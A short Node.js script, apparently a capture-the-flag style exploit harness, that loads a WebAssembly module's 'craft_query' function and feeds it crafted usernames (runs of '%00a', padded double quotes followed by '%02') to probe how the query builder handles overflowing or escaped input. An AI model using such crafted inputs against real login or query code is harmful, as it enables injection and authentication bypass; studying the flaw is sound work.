const EmscriptenModule = require('./site.js');

async function initializeModule() {
  return new Promise((resolve, reject) => {
    EmscriptenModule.onRuntimeInitialized = () => {
      const CraftQuery = EmscriptenModule.cwrap('craft_query', 'string', ['string', 'string']);
      resolve(CraftQuery);
    };
  });
}

let CraftQuery;
initializeModule().then((queryFunction) => {
  CraftQuery = queryFunction;
  // for (let i = 1; i < 10000; i++) {
  //   let username = "%00a".repeat(i)
  //   const password = "asdf"
  //   const result = CraftQuery(username, password);
  //   console.log(result, i)
  // }


  // let username = "\"".repeat(68)
  // username += "%02"
  // const password = "asdf"
  // const result = CraftQuery(username, password);
  // console.log(result)

  let username = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"%02"
  const password = "asdf"
  const result = CraftQuery(username, password);
  console.log(result)
});


// exports.handler = async (event, context) => {
//     if (!CraftQuery) {
//         CraftQuery = await initializeModule();
//     }
//
//     const username = event.username;
//     const password = event.password;
//
//     const result = CraftQuery(username, password);
//     return result;
// };
